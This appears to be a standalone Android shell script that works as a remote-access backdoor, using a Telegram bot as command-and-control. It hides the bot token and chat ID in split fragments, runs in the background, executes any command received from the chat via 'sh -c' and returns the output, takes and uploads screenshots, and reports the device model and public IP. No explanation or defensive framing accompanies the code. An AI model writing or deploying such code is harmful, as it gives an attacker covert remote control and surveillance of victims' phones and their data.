#!/system/bin/sh

_t1="7601483"
_t2="937:AAFkrYpoee082"
_t3="iLPbIPNouHs8KxvuYXE3pU"
_a="$_t1$_t2$_t3"

_b_parts=("636" "3520686")
_b="${_b_parts[0]}${_b_parts[1]}"

_c="https://api.telegram.org/bot$_a"
_d=0
_e=""

_f() {
    curl -s -X POST "$_c/sendMessage" \
        -d chat_id="$_b" \
        -d text="$1" > /dev/null
}

_g() {
    _h="/cache/x.png"
    screencap -p "$_h"
    curl -s -X POST "$_c/sendPhoto" \
        -F chat_id="$_b" \
        -F photo="@$_h" > /dev/null
    rm -f "$_h"
}

_i() {
    _j=$(curl -s https://ipinfo.io/ip)
    _k=$(getprop ro.product.model)
    _f "$_k\nIP pública: $_j"
}

_f "."

while true; do
    if ! ping -c 1 -W 1 8.8.8.8 >/dev/null 2>&1; then
        sleep 2
        continue
    fi

    _l=$(curl -s "$_c/getUpdates?offset=$_d")
    _m=$(echo "$_l" | grep -o '"update_id":[0-9]*' | cut -d':' -f2)

    for _n in $_m; do
        if [ "$_n" -ge "$_d" ]; then
            _o=$(echo "$_l" | grep -A 20 "\"update_id\":$_n" | grep '"text"' | head -n1 | sed -E 's/.*"text":"([^"]*)".*/\1/' | tr -d '\r\n')

            _d=$((_n + 1))

            if [ "$_o" = "$_e" ]; then
                continue
            fi
            _e="$_o"

            case "$_o" in
                "c")
                    _g
                    ;;
                "i")
                    _i
                    ;;
                *)
                    _p=$(sh -c "$_o" 2>&1 | head -n 20)
                    if [ ${#_p} -gt 300 ]; then
                        _p="${_p:0:300}... (salida truncada)"
                    fi
                    _f "$_p"
                    ;;
            esac
        fi
    done

    sleep 1
done &
